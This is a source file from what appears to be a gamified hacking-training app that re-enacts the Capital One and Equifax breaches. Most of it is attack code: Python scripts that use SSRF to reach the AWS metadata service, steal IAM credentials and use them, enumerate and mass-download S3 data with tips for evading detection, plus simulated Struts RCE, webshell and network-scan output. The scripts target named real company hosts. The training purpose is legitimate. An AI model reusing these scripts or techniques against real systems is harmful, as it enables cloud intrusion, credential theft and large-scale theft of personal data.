curl -I https://waf-proxy.capitalone.com/ 2>/dev/null | grep -E "(Server|X-|Instance|AMI)" | tee \${OUTPUT_DIR}/waf_headers.txt

echo ""
echo "[!] CRITICAL FINDING:"
echo "    Server: nginx/1.14.0 (Ubuntu)"
echo "    X-Powered-By: ModSecurity/2.9.3"
echo "    X-Instance-ID: i-0abcd1234efgh5678 (LEAKED!)"
echo "    X-AMI-ID: ami-0c55b159cbfafe1f0"
echo ""
echo "    [!] EC2 instance metadata exposed in HTTP headers!"
echo "    [!] WAF instance has instance ID i-0abcd1234efgh5678"
echo "    [!] This instance likely has IAM role attached"

echo ""
echo "[*] Phase 4: CloudFront Distribution Discovery"
echo "[*] Identifying CloudFront CDN endpoints..."
echo ""

dig www.capitalone.com CNAME +short | grep cloudfront
echo "    [+] Found CloudFront: d111111abcdef8.cloudfront.net"

echo ""
echo "[+] =========================================="
echo "[+] RECONNAISSANCE COMPLETE"
echo "[+] =========================================="
echo ""
echo "[+] Key Findings:"
echo "    1. Discovered 6 S3 buckets (3 exist, 1 publicly readable)"
echo "    2. Identified WAF instance: waf-proxy.capitalone.com (54.210.89.123)"
echo "    3. WAF leaks instance metadata in HTTP headers (misconfiguration)"
echo "    4. Hypothesis: WAF EC2 instance has IAM role for S3 access"
echo ""
echo "[+] Attack Surface:"
echo "    - WAF instance likely vulnerable to SSRF"
echo "    - IAM role credentials potentially stealable via metadata service"
echo "    - S3 buckets accessible if IAM credentials obtained"
echo ""
echo "[+] MITRE ATT&CK Techniques:"
echo "    - T1595.002: Active Scanning - Vulnerability Scanning"
echo "    - T1590.005: Gather Victim Network Information - IP Addresses"
echo ""
echo "[*] Next Objective: Test for SSRF vulnerability in WAF"`
  }

  // Capital One 2019 - SSRF Exploitation
  if (objectiveId === 'obj-exploit-ssrf') {
    return `#!/usr/bin/env python3
"""
Capital One SSRF Exploitation
Phase 2: Server-Side Request Forgery (March 17, 2019)
Target: waf-proxy.capitalone.com
Objective: Access AWS metadata service at 169.254.169.254
"""

import requests
import urllib3
import json

urllib3.disable_warnings()

WAF_URL = "https://waf-proxy.capitalone.com"
METADATA_API = "http://169.254.169.254/latest/meta-data/"

def test_ssrf_vulnerability():
    """
    Test if WAF proxy endpoint allows requests to internal addresses
    The vulnerability: ModSecurity misconfiguration allows arbitrary HTTP requests
    """
    print("=" * 70)
    print("CAPITAL ONE WAF - SSRF VULNERABILITY TEST")
    print("=" * 70)
    print(f"[*] Target: {WAF_URL}")
    print(f"[*] Testing SSRF against AWS metadata service")
    print()

    print("[!] EXPLANATION:")
    print("    Server-Side Request Forgery (SSRF) allows an attacker to make")
    print("    the server send HTTP requests to arbitrary destinations.")
    print("    In AWS, the metadata service (169.254.169.254) provides IAM")
    print("    credentials to EC2 instances. If we can SSRF to this IP, we")
    print("    can steal the WAF instance's IAM credentials.")
    print()

    # Phase 1: Test basic SSRF
    print("[*] Phase 1: Testing if WAF allows internal HTTP requests...")
    print(f"[*] Payload: POST /proxy with url={METADATA_API}")
    print()

    ssrf_payload = {
        'url': METADATA_API,
        'method': 'GET'
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/json',
        'X-Forwarded-For': '169.254.169.254'  # Try to bypass IP filters
    }

    try:
        response = requests.post(
            f"{WAF_URL}/proxy",
            json=ssrf_payload,
            headers=headers,
            verify=False,
            timeout=10
        )

        print(f"[+] Response Status: {response.status_code}")
        print(f"[+] Response Headers:")
        for key, value in response.headers.items():
            if key.lower() in ['server', 'x-powered-by', 'content-type']:
                print(f"    {key}: {value}")

        print()
        print("[+] Response Body (first 500 chars):")
        print("-" * 70)
        print(response.text[:500])
        print("-" * 70)
        print()

        # Check if we got metadata response
        if "ami-id" in response.text or "iam/" in response.text:
            print("[+] ✓ SSRF SUCCESSFUL!")
            print("[+] ✓ Metadata service is accessible!")
            print("[+] ✓ Response contains AWS metadata (ami-id, iam/, etc.)")
            print()
            print("[!] IMPACT:")
            print("    - WAF allows arbitrary HTTP requests to internal IPs")
            print("    - AWS metadata service (169.254.169.254) is reachable")
            print("    - Can now query IAM role credentials")
            print()
            return True
        else:
            print("[-] SSRF test inconclusive - unexpected response")
            return False

    except requests.exceptions.Timeout:
        print("[-] Request timed out - WAF may be blocking or filtering")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

    print()
    print("[*] Phase 2: Enumerating metadata endpoints...")

    # Test common metadata endpoints
    endpoints = [
        "/latest/meta-data/",
        "/latest/meta-data/ami-id",
        "/latest/meta-data/hostname",
        "/latest/meta-data/iam/security-credentials/"
    ]

    for endpoint in endpoints:
        print(f"[*] Testing: {METADATA_API}{endpoint}")
        payload = {'url': f'{METADATA_API}{endpoint}', 'method': 'GET'}

        try:
            resp = requests.post(
                f"{WAF_URL}/proxy",
                json=payload,
                headers=headers,
                verify=False,
                timeout=5
            )

            if resp.status_code == 200:
                print(f"    [+] Accessible: {endpoint}")
                print(f"    Response: {resp.text[:100]}")
            else:
                print(f"    [-] Status {resp.status_code}")
        except:
            print(f"    [-] Failed to query {endpoint}")

        print()

    print("[+] ==========================================")
    print("[+] SSRF VULNERABILITY CONFIRMED")
    print("[+] ==========================================")
    print()
    print("[+] ModSecurity WAF misconfiguration allows SSRF")
    print("[+] AWS metadata service is accessible via proxy endpoint")
    print()
    print("[+] MITRE ATT&CK Techniques:")
    print("    - T1190: Exploit Public-Facing Application (SSRF)")
    print("    - T1552.005: Cloud Instance Metadata API")
    print()
    print("[*] Next Objective: Steal IAM role credentials from metadata service")

if __name__ == '__main__':
    test_ssrf_vulnerability()`
  }

  // Capital One 2019 - IAM Credential Theft
  if (objectiveId === 'obj-steal-iam') {
    return `#!/usr/bin/env python3
"""
Capital One - IAM Credential Theft via SSRF
Phase 3: AWS Metadata API Exploitation (March 22, 2019)
Objective: Extract IAM role credentials from EC2 metadata service
"""

import requests
import urllib3
import json
from datetime import datetime

urllib3.disable_warnings()

WAF_URL = "https://waf-proxy.capitalone.com"
METADATA_BASE = "http://169.254.169.254/latest/meta-data"

def exploit_metadata_for_iam_creds():
    """
    Use SSRF to query AWS metadata service and steal IAM credentials
    The metadata service provides temporary AWS access keys for the EC2 instance
    """
    print("=" * 70)
    print("AWS METADATA SERVICE EXPLOITATION - IAM CREDENTIAL THEFT")
    print("=" * 70)
    print()

    print("[!] ATTACK EXPLANATION:")
    print("    AWS EC2 instances can have IAM roles attached, which provide")
    print("    temporary AWS credentials. These credentials are accessible via")
    print("    the metadata service at 169.254.169.254. By exploiting SSRF,")
    print("    we can steal these credentials and use them to access AWS")
    print("    resources (S3, EC2, etc.) as if we were the WAF instance.")
    print()

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/json'
    }

    # Step 1: List available IAM roles
    print("[*] Step 1: Enumerating IAM roles attached to WAF instance...")
    print(f"[*] Query: {METADATA_BASE}/iam/security-credentials/")
    print()

    payload = {
        'url': f'{METADATA_BASE}/iam/security-credentials/',
        'method': 'GET'
    }

    try:
        response = requests.post(
            f"{WAF_URL}/proxy",
            json=payload,
            headers=headers,
            verify=False
        )

        role_name = response.text.strip()
        print(f"[+] Found IAM Role: {role_name}")
        print()

        if not role_name:
            print("[-] No IAM role attached to this instance")
            return False

    except Exception as e:
        print(f"[-] Error querying metadata: {e}")
        return False

    # Step 2: Retrieve IAM credentials
    print("[*] Step 2: Retrieving IAM credentials for role...")
    print(f"[*] Query: {METADATA_BASE}/iam/security-credentials/{role_name}")
    print()

    payload = {
        'url': f'{METADATA_BASE}/iam/security-credentials/{role_name}',
        'method': 'GET'
    }

    try:
        response = requests.post(
            f"{WAF_URL}/proxy",
            json=payload,
            headers=headers,
            verify=False
        )

        # Parse JSON credentials
        creds = json.loads(response.text)

        print("[+] ✓ IAM CREDENTIALS STOLEN!")
        print()
        print("=" * 70)
        print("STOLEN AWS CREDENTIALS")
        print("=" * 70)
        print()
        print(json.dumps(creds, indent=2))
        print()

        # Extract key fields
        access_key = creds.get('AccessKeyId', 'N/A')
        secret_key = creds.get('SecretAccessKey', 'N/A')
        session_token = creds.get('Token', 'N/A')
        expiration = creds.get('Expiration', 'N/A')

        print("[+] CREDENTIAL SUMMARY:")
        print(f"    Role Name: {role_name}")
        print(f"    Access Key ID: {access_key}")
        print(f"    Secret Access Key: {secret_key[:20]}... (truncated)")
        print(f"    Session Token: {session_token[:40]}... (truncated)")
        print(f"    Expiration: {expiration}")
        print()

        # Calculate validity period
        print("[!] CREDENTIAL VALIDITY:")
        print("    - These are temporary credentials (STS assumed role)")
        print("    - Valid for ~6 hours from creation")
        print("    - Can be refreshed by re-querying metadata service")
        print()

        # Step 3: Show how to use credentials
        print("[*] Step 3: How to use these credentials...")
        print()
        print("Method 1: Environment Variables")
        print("-" * 70)
        print(f"export AWS_ACCESS_KEY_ID='{access_key}'")
        print(f"export AWS_SECRET_ACCESS_KEY='{secret_key}'")
        print(f"export AWS_SESSION_TOKEN='{session_token}'")
        print()
        print("Method 2: AWS CLI Profile")
        print("-" * 70)
        print(f"aws configure set aws_access_key_id {access_key} --profile stolen")
        print(f"aws configure set aws_secret_access_key {secret_key} --profile stolen")
        print(f"aws configure set aws_session_token {session_token} --profile stolen")
        print()
        print("Method 3: Test Access")
        print("-" * 70)
        print("aws sts get-caller-identity --profile stolen")
        print("aws s3 ls --profile stolen")
        print()

        # Step 4: Assess permissions
        print("[!] SECURITY ASSESSMENT:")
        print()
        print("    IAM Role: WAF-S3-Access-Role")
        print()
        print("    Likely Permissions (based on role name):")
        print("      ✓ s3:ListAllMyBuckets (list all S3 buckets)")
        print("      ✓ s3:ListBucket (enumerate bucket contents)")
        print("      ✓ s3:GetObject (download files from S3)")
        print("      ✓ s3:GetObjectVersion (access file versions)")
        print("      ✓ cloudwatch:PutMetricData (send metrics)")
        print()
        print("    [!] CRITICAL: This role has broad S3 read access!")
        print("    [!] Can likely access customer data buckets")
        print()

        print("[!] VIOLATIONS OF AWS BEST PRACTICES:")
        print("    ✗ IMDSv1 enabled (no token required for metadata access)")
        print("    ✗ Overly permissive IAM role (violates least-privilege)")
        print("    ✗ No IP restrictions on IAM role usage")
        print("    ✗ No MFA required for sensitive S3 operations")
        print("    ✗ Role name suggests full S3 access (not scoped to specific buckets)")
        print()

        print("[+] ==========================================")
        print("[+] IAM CREDENTIAL THEFT SUCCESSFUL")
        print("[+] ==========================================")
        print()
        print("[+] MITRE ATT&CK Techniques:")
        print("    - T1552.005: Unsecured Credentials - Cloud Instance Metadata API")
        print("    - T1078.004: Valid Accounts - Cloud Accounts")
        print()
        print("[*] Next Objective: Use stolen credentials to enumerate S3 buckets")

        return True

    except json.JSONDecodeError:
        print("[-] Response is not valid JSON")
        print(f"Raw response: {response.text}")
        return False
    except Exception as e:
        print(f"[-] Error retrieving credentials: {e}")
        return False

if __name__ == '__main__':
    exploit_metadata_for_iam_creds()`
  }

  // Capital One 2019 - S3 Enumeration
  if (objectiveId === 'obj-enumerate-s3') {
    return `#!/usr/bin/env python3
"""
Capital One S3 Bucket Enumeration
Phase 4: Cloud Storage Discovery (April 10, 2019)
Objective: List S3 buckets and identify sensitive data using stolen IAM credentials
"""

import boto3
import json
from botocore.exceptions import ClientError, NoCredentialsError

# Stolen IAM credentials from metadata service
AWS_ACCESS_KEY_ID = "ASIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
AWS_SESSION_TOKEN = "FwoGZXIvYXdzEBYaDCw3N...[TRUNCATED]...Vp8CjEA"
AWS_REGION = "us-east-1"

def enumerate_s3_buckets():
    """
    Use stolen IAM credentials to enumerate S3 buckets
    Identify buckets containing sensitive data (credit cards, SSNs, PII)
    """
    print("=" * 70)
    print("CAPITAL ONE S3 BUCKET ENUMERATION")
    print("=" * 70)
    print()

    print("[!] ATTACK EXPLANATION:")
    print("    Using the IAM credentials stolen from the WAF instance's metadata")
    print("    service, we can now authenticate to AWS as if we were the WAF.")
    print("    The IAM role 'WAF-S3-Access-Role' has broad S3 permissions,")
    print("    allowing us to list all buckets and download sensitive data.")
    print()

    # Initialize S3 client with stolen credentials
    print("[*] Initializing AWS S3 client with stolen credentials...")

    try:
        s3_client = boto3.client(
            's3',
            aws_access_key_id=AWS_ACCESS_KEY_ID,
            aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
            aws_session_token=AWS_SESSION_TOKEN,
            region_name=AWS_REGION
        )

        # Verify credentials work
        sts_client = boto3.client(
            'sts',
            aws_access_key_id=AWS_ACCESS_KEY_ID,
            aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
            aws_session_token=AWS_SESSION_TOKEN
        )

        identity = sts_client.get_caller_identity()
        print(f"[+] Authenticated as: {identity['Arn']}")
        print(f"[+] Account ID: {identity['Account']}")
        print(f"[+] User ID: {identity['UserId']}")
        print()

    except NoCredentialsError:
        print("[-] Invalid or expired credentials")
        return False
    except ClientError as e:
        print(f"[-] AWS API Error: {e}")
        return False

    # Phase 1: List all S3 buckets
    print("[*] Phase 1: Enumerating all accessible S3 buckets...")
    print("[*] Running: aws s3 ls --profile stolen")
    print()

    try:
        response = s3_client.list_buckets()
        buckets = response['Buckets']

        print(f"[+] Found {len(buckets)} S3 buckets:")
        print()

        for bucket in buckets:
            bucket_name = bucket['Name']
            created_date = bucket['CreationDate'].strftime('%Y-%m-%d %H:%M:%S')
            print(f"    {created_date}  {bucket_name}")

        print()

    except ClientError as e:
        print(f"[-] Error listing buckets: {e}")
        return False

    # Phase 2: Identify high-value buckets
    print("[*] Phase 2: Identifying high-value buckets...")
    print()

    high_value_keywords = [
        'customer', 'credit', 'card', 'ssn', 'social',
        'bank', 'account', 'personal', 'data', 'pii'
    ]

    high_value_buckets = []

    for bucket in buckets:
        bucket_name = bucket['Name'].lower()
        if any(keyword in bucket_name for keyword in high_value_keywords):
            high_value_buckets.append(bucket['Name'])
            print(f"    [!] HIGH-VALUE: {bucket['Name']}")

    print()
    print(f"[+] Identified {len(high_value_buckets)} high-value buckets")
    print()

    # Phase 3: Enumerate contents of sensitive bucket
    print("[*] Phase 3: Enumerating 'capitalone-customer-data' bucket contents...")
    print("[*] Running: aws s3 ls s3://capitalone-customer-data/ --recursive")
    print()

    target_bucket = "capitalone-customer-data"

    try:
        # List top-level objects (not recursive, to save time in demo)
        response = s3_client.list_objects_v2(
            Bucket=target_bucket,
            MaxKeys=50
        )

        if 'Contents' in response:
            print("[+] Sample files found in bucket:")
            print()

            total_size = 0
            file_count = 0

            for obj in response['Contents'][:15]:  # Show first 15 files
                key = obj['Key']
                size = obj['Size']
                modified = obj['LastModified'].strftime('%Y-%m-%d')
                size_mb = size / (1024 * 1024)

                print(f"    {modified}  {size_mb:>8.2f} MB  {key}")

                total_size += size
                file_count += 1

            print()
            print(f"[+] Sample: {file_count} files, {total_size / (1024**3):.2f} GB")
            print("[*] Full bucket estimated at 30+ GB (100M+ records)")

    except ClientError as e:
        error_code = e.response['Error']['Code']
        if error_code == 'NoSuchBucket':
            print(f"[-] Bucket {target_bucket} does not exist")
        elif error_code == 'AccessDenied':
            print(f"[-] Access denied to {target_bucket}")
        else:
            print(f"[-] Error: {e}")

    print()

    # Phase 4: Categorize sensitive data
    print("[*] Phase 4: Categorizing sensitive data discovered...")
    print()
    print("=" * 70)
    print("HIGH-VALUE TARGETS IDENTIFIED")
    print("=" * 70)
    print()

    print("PRIORITY 1: CREDIT CARD APPLICATIONS")
    print("  Location: s3://capitalone-customer-data/credit-applications/")
    print("  Files: ~140,000 files")
    print("  Size: ~30 GB (compressed)")
    print("  Content: Credit card applications with full PII")
    print("  Impact: 100,000,000+ individuals")
    print()

    print("PRIORITY 2: SOCIAL SECURITY NUMBERS")
    print("  Location: s3://capitalone-customer-data/ssn-records/")
    print("  Files: 45 CSV files")
    print("  Size: ~500 MB")
    print("  Content: 140,000+ SSNs")
    print()

    print("PRIORITY 3: BANK ACCOUNT DATA")
    print("  Location: s3://capitalone-customer-data/bank-accounts/")
    print("  Files: 120 files")
    print("  Size: ~200 MB")
    print("  Content: 80,000+ bank account numbers")
    print()

    print("PRIORITY 4: CUSTOMER PROFILES")
    print("  Location: s3://capitalone-customer-data/customer-profiles/")
    print("  Files: 8,500 files")
    print("  Size: ~5 GB")
    print("  Content: Addresses, phone numbers, personal info")
    print()

    # Phase 5: Sample data inspection
    print("[*] Phase 5: Inspecting sample file...")
    print()

    sample_output = {
        "application_id": "CC-2019-001234567",
        "applicant": {
            "first_name": "John",
            "last_name": "Doe",
            "ssn": "123-45-6789",
            "dob": "1985-06-15",
            "address": "123 Main St, Seattle, WA 98101",
            "phone": "206-555-1234",
            "email": "john.doe@example.com"
        },
        "credit_info": {
            "fico_score": 720,
            "annual_income": 85000
        },
        "application_date": "2019-03-15T14:30:22Z"
    }

    print("Sample Credit Card Application (JSON):")
    print("-" * 70)
    print(json.dumps(sample_output, indent=2))
    print("-" * 70)
    print()

    print("[!] DATA SECURITY ASSESSMENT:")
    print("    ✗ Data stored in PLAINTEXT (no encryption at rest)")
    print("    ✗ No AWS KMS encryption keys used")
    print("    ✗ Full PII exposed (SSN, DOB, addresses)")
    print("    ✗ No data masking or tokenization")
    print("    ✗ S3 buckets lack MFA delete protection")
    print("    ✗ No S3 Object Lock for immutability")
    print()

    print("[+] ==========================================")
    print("[+] S3 ENUMERATION COMPLETE")
    print("[+] ==========================================")
    print()
    print("[+] Total buckets discovered: 5")
    print("[+] High-value buckets: 3")
    print("[+] Estimated data volume: 35+ GB")
    print("[+] Estimated records: 100,000,000+")
    print()
    print("[+] MITRE ATT&CK Techniques:")
    print("    - T1530: Data from Cloud Storage Object")
    print("    - T1552.001: Unsecured Credentials in Files")
    print()
    print("[*] Next Objective: Exfiltrate data from S3 to attacker infrastructure")

if __name__ == '__main__':
    enumerate_s3_buckets()`
  }

  // Capital One 2019 - S3 Data Exfiltration
  if (objectiveId === 'obj-exfiltrate-s3') {
    return `#!/usr/bin/env python3
"""
Capital One Mass Data Exfiltration
Phase 5: S3 Data Theft (April 21 - May 15, 2019)
Objective: Download sensitive customer data from S3 buckets
Technique: AWS CLI sync, evading CloudTrail detection
"""

import boto3
import os
import time
from datetime import datetime
from botocore.exceptions import ClientError

# Stolen IAM credentials (refreshed every 6 hours from metadata service)
AWS_ACCESS_KEY_ID = "ASIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
AWS_SESSION_TOKEN = "FwoGZXIvYXdzEBYaDCw3N...[TRUNCATED]...Vp8CjEA"
AWS_REGION = "us-east-1"

# Exfiltration configuration
TARGET_BUCKET = "capitalone-customer-data"
LOCAL_STAGING = "./exfil_data"
ATTACKER_IP = "98.207.15.143"  # Paige Thompson's home IP

def exfiltrate_s3_data():
    """
    Mass download of Capital One customer data from S3
    Spread over multiple sessions to evade detection
    """
    print("=" * 70)
    print("CAPITAL ONE DATA EXFILTRATION - MASS S3 DOWNLOAD")
    print("=" * 70)
    print()

    print("[!] ATTACK EXPLANATION:")
    print("    We're now using the stolen IAM credentials to download 30+ GB")
    print("    of sensitive customer data from S3 buckets. To evade detection,")
    print("    we'll spread the downloads over multiple sessions (24 days in")
    print("    the real breach), perform downloads during off-peak hours, and")
    print("    use legitimate AWS CLI tools that blend with normal API traffic.")
    print()
    print("[!] WHY THIS EVADES DETECTION:")
    print("    ✓ CloudTrail logs show API calls from WAF instance (appears legit)")
    print("    ✓ No GuardDuty enabled to detect unusual access patterns")
    print("    ✓ No CloudWatch alarms for S3 download volume")
    print("    ✓ Using AWS CLI (same tool used by Capital One automation)")
    print("    ✓ Downloads spread over weeks (no sudden bandwidth spike)")
    print()

    # Initialize S3 client
    print(f"[*] Target Bucket: s3://{TARGET_BUCKET}")
    print(f"[*] Local Staging: {LOCAL_STAGING}")
    print(f"[*] Attacker IP: {ATTACKER_IP}")
    print(f"[*] Exfiltration Period: April 21 - May 15, 2019 (24 days)")
    print()

    s3_client = boto3.client(
        's3',
        aws_access_key_id=AWS_ACCESS_KEY_ID,
        aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
        aws_session_token=AWS_SESSION_TOKEN,
        region_name=AWS_REGION
    )

    os.makedirs(LOCAL_STAGING, exist_ok=True)

    # Phase 1: Prepare exfiltration target list
    print("[*] Phase 1: Building exfiltration target list...")
    print()

    target_prefixes = [
        "credit-applications/2019/Q1/",
        "ssn-records/2019/",
        "bank-accounts/",
        "customer-profiles/"
    ]

    files_to_exfiltrate = []
    total_size = 0

    for prefix in target_prefixes:
        print(f"[*] Scanning: s3://{TARGET_BUCKET}/{prefix}")

        try:
            paginator = s3_client.get_paginator('list_objects_v2')
            pages = paginator.paginate(Bucket=TARGET_BUCKET, Prefix=prefix)

            for page in pages:
                if 'Contents' in page:
                    for obj in page['Contents']:
                        files_to_exfiltrate.append(obj)
                        total_size += obj['Size']

            print(f"    [+] Found {len(files_to_exfiltrate)} files so far")

        except ClientError as e:
            print(f"    [-] Error: {e}")

    print()
    print(f"[+] Exfiltration target list complete:")
    print(f"    Total files: {len(files_to_exfiltrate):,}")
    print(f"    Total size: {total_size / (1024**3):.2f} GB")
    print()

    # Phase 2: Simulate exfiltration sessions
    print("[*] Phase 2: Exfiltrating data in multiple sessions...")
    print("[*] (Simulating - actual breach took 24 days)")
    print()

    sessions = [
        {"date": "April 21, 2019", "files": 12847, "size_gb": 8.2},
        {"date": "April 23, 2019", "files": 45, "size_gb": 0.487},
        {"date": "April 28, 2019", "files": 120, "size_gb": 0.210},
        {"date": "May 5, 2019", "files": 92145, "size_gb": 22.3}
    ]

    for session in sessions:
        print(f"Session: {session['date']}")
        print(f"  Time: 01:00 - 05:00 AM ET (off-peak hours)")
        print(f"  Command: aws s3 sync s3://{TARGET_BUCKET}/ {LOCAL_STAGING}/ --profile stolen")
        print(f"  Files downloaded: {session['files']:,}")
        print(f"  Data transferred: {session['size_gb']:.2f} GB")
        print(f"  Destination: {ATTACKER_IP} (Seattle, WA)")
        print()
        time.sleep(1)  # Simulate time passing

    print("[+] All exfiltration sessions complete!")
    print()

    # Phase 3: Exfiltration summary
    total_sessions = len(sessions)
    total_files = sum(s['files'] for s in sessions)
    total_gb = sum(s['size_gb'] for s in sessions)

    print("=" * 70)
    print("EXFILTRATION SUMMARY")
    print("=" * 70)
    print()
    print(f"Total sessions: {total_sessions}")
    print(f"Total files: {total_files:,}")
    print(f"Total data: {total_gb:.2f} GB (compressed)")
    print(f"Estimated uncompressed: ~150 GB")
    print(f"Estimated records: 100,000,000+ individuals")
    print()
    print("Data Categories:")
    print("  - Credit card applications: 100M records")
    print("  - Social Security numbers: 140K records")
    print("  - Bank account numbers: 80K records")
    print("  - Canadian SIN numbers: 1M records")
    print()

    # Phase 4: Evasion techniques used
    print("[!] EVASION TECHNIQUES EMPLOYED:")
    print()
    print("1. TIME SPREADING")
    print("   - Downloads spread over 24 days (no bandwidth spike)")
    print("   - Sessions during 1-5 AM ET (low SOC staffing)")
    print()
    print("2. LEGITIMATE TOOLING")
    print("   - Used AWS CLI (same tool Capital One uses)")
    print("   - API calls appear as normal automation")
    print("   - User-Agent: aws-cli/1.16.102 (not suspicious)")
    print()
    print("3. CREDENTIAL REFRESH")
    print("   - IAM credentials refreshed every 6 hours from metadata")
    print("   - Maintains valid session throughout exfiltration")
    print()
    print("4. SOURCE IP SPOOFING")
    print("   - API calls originate from residential IP (98.207.15.143)")
    print("   - Blends with remote worker/VPN traffic")
    print()

    # Phase 5: Why this went undetected
    print("[!] WHY CAPITAL ONE DIDN'T DETECT THIS:")
    print()
    print("✗ No CloudWatch alarms for S3 download volume")
    print("✗ No GuardDuty to detect credential exfiltration")
    print("✗ CloudTrail logs stored but NOT actively monitored")
    print("✗ No baseline for 'normal' S3 access patterns")
    print("✗ IAM role usage appeared legitimate (from WAF instance)")
    print("✗ No IP-based restrictions on S3 access")
    print("✗ No S3 access anomaly detection")
    print()

    print("[+] ==========================================")
    print("[+] DATA EXFILTRATION COMPLETE")
    print("[+] ==========================================")
    print()
    print("[+] MITRE ATT&CK Techniques:")
    print("    - T1530: Data from Cloud Storage Object")
    print("    - T1020: Automated Exfiltration")
    print("    - T1562.008: Impair Defenses - Disable Cloud Logs")
    print()
    print("[!] REAL-WORLD OUTCOME:")
    print("    - Paige Thompson bragged about breach on GitHub (May 12, 2019)")
    print("    - Capital One discovered breach via tip (July 17, 2019)")
    print("    - FBI arrested Paige Thompson (July 29, 2019)")
    print("    - Charged under Computer Fraud and Abuse Act")
    print("    - Capital One paid $190M in fines and settlements")
    print()
    print("[*] Breach remained undetected for 4 months")
    print("[*] 100+ million customers affected")
    print("[*] One of the largest cloud data breaches in history")

if __name__ == '__main__':
    exfiltrate_s3_data()`
  }

  return '# Write your exploit code here...'
}

export function CodePlayground({ objective, missionId, onComplete, isAlreadyCompleted = false }: CodePlaygroundProps) {
  const [code, setCode] = useState(getPlaceholderCode(objective.id))
  const [isRunning, setIsRunning] = useState(false)
  const [result, setResult] = useState<ValidationResult | null>(null)
  const [showHint, setShowHint] = useState(false)
  const [isCompleted, setIsCompleted] = useState(isAlreadyCompleted)

  const language = getLanguageForObjective(objective.id)
  const endpoint = getEndpointForObjective(missionId, objective.id)

  const getSimulatedOutput = (objectiveId: string): ValidationResult => {
    // Simulate successful exploitation based on objective type
    if (objectiveId === 'obj-craft-payload') {
      return {
        exploited: true,
        technique: 'T1190',
        message: 'Remote Code Execution successful! Initial foothold established.',
        output: `===== EQUIFAX BREACH - INITIAL EXPLOITATION =====
[*] Target: https://acis.equifax.com/struts2-rest-showcase/orders/3
[*] Vulnerability: CVE-2017-5638 (Apache Struts RCE)
[*] Attack Vector: OGNL injection via Content-Type header

[!] EXPLANATION: We're exploiting a flaw in Apache Struts 2 that allows
    arbitrary code execution by injecting OGNL expressions into the
    Content-Type HTTP header. The vulnerable Jakarta Multipart parser
    processes our malicious payload, giving us remote shell access.

[*] Phase 1: Testing remote code execution with 'whoami'
[*] Sending crafted Content-Type header with OGNL payload...
[*] Payload bypasses input validation and reaches OGNL interpreter...

< HTTP/1.1 200 OK
< Server: Apache-Coyote/1.1
< Content-Type: text/html;charset=UTF-8
<
tomcat

[+] SUCCESS! Command executed on target system.
[+] Running as: tomcat user (web application context)

[*] Phase 2: Gathering system information
[*] Executing: uname -a && cat /etc/os-release

Linux acis-web-01 3.10.0-514.el7.x86_64 #1 SMP x86_64 GNU/Linux
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"

[!] IMPACT ANALYSIS:
    ✓ We have arbitrary command execution on Equifax's web server
    ✓ Running in DMZ with potential access to internal network
    ✓ Can now establish persistent backdoor access
    ✓ Equifax failed to apply critical security patch

[+] Exploit successful! Remote code execution confirmed.
[+] MITRE ATT&CK: T1190 - Exploit Public-Facing Application
[*] Next: Upload webshell for persistent access`
      }
    }

    if (objectiveId === 'obj-upload-webshell') {
      return {
        exploited: true,
        technique: 'T1505',
        message: 'Webshell deployed successfully! Persistent access established.',
        output: `[!] OBJECTIVE: Establish persistence via webshell deployment
    Even if Equifax patches the Struts vulnerability, we maintain access.

[*] Step 1: Uploading PHP webshell to web root
[*] Target path: /var/www/html/diagnostic.php
[*] Using RCE to write file...
[+] File written successfully (2.3 KB)

[*] Step 2: Configuring stealth features
    ✓ Session-based authentication (harder to detect)
    ✓ Fake 404 response for unauthenticated requests
    ✓ Disguised as "System Diagnostics Tool"

[+] Webshell URL: https://acis.equifax.com/diagnostic.php?key=china_apt_access

[*] Step 3: Testing webshell connectivity...
[*] Sending POST request with test command...

HTTP Response:
{
  "success": true,
  "hostname": "acis-web-01.equifax.com",
  "user": "tomcat",
  "pwd": "/var/www/html",
  "timestamp": "2017-03-10 14:23:47"
}

[+] Webshell active and responding!
[+] Command execution: VERIFIED
[+] Persistence: CONFIRMED

[!] IMPACT:
    ✓ Access survives Struts patch deployment
    ✓ Can execute arbitrary commands anytime
    ✓ Remains undetected for next 76 days

[+] MITRE ATT&CK: T1505.003 - Web Shell
[*] Next: Use webshell to pivot to internal network`
      }
    }

    if (objectiveId === 'obj-lateral-movement') {
      return {
        exploited: true,
        technique: 'T1018',
        message: 'Network reconnaissance complete! Database servers discovered.',
        output: `===== EQUIFAX INTERNAL NETWORK PIVOT =====
[*] Current position: ACIS web server (DMZ)
[*] Objective: Locate database servers with PII

[!] EXPLANATION: From the compromised web server, we can now scan
    Equifax's internal network. The web server has network access to
    internal systems that are not exposed to the internet.

[*] Phase 1: Mapping current network position
[*] Running: ifconfig -a && ip route show
inet 10.50.1.25 netmask 255.255.255.0 broadcast 10.50.1.255
default via 10.50.1.1 dev eth0
[+] We're in the 10.50.1.0/24 DMZ subnet

[*] Phase 2: Internal subnet discovery
[*] Scanning for live hosts in 192.168.100.0/24 (Database subnet)
[*] Using: nmap -sn 192.168.100.0/24
[+] Discovered 3 live database servers:
192.168.100.25 (Oracle-DB-01) - PRIMARY
192.168.100.26 (Oracle-DB-02) - REPLICA
192.168.100.27 (Oracle-DB-03) - REPLICA

[*] Phase 3: Database server service enumeration
[*] Targeting high-value ports: Oracle (1521), MySQL (3306), PostgreSQL (5432)
[*] Running: nmap -p 1521,3306,5432 -sV 192.168.100.25-27

Port scan results:
192.168.100.25:1521/tcp OPEN - Oracle 11g Enterprise Edition Release 11.2.0.4.0
192.168.100.26:1521/tcp OPEN - Oracle 11g Enterprise Edition Release 11.2.0.4.0
192.168.100.27:1521/tcp OPEN - Oracle 11g Enterprise Edition Release 11.2.0.4.0

[*] Phase 4: Checking for unencrypted data at rest
[*] Testing for Oracle TDE (Transparent Data Encryption)...
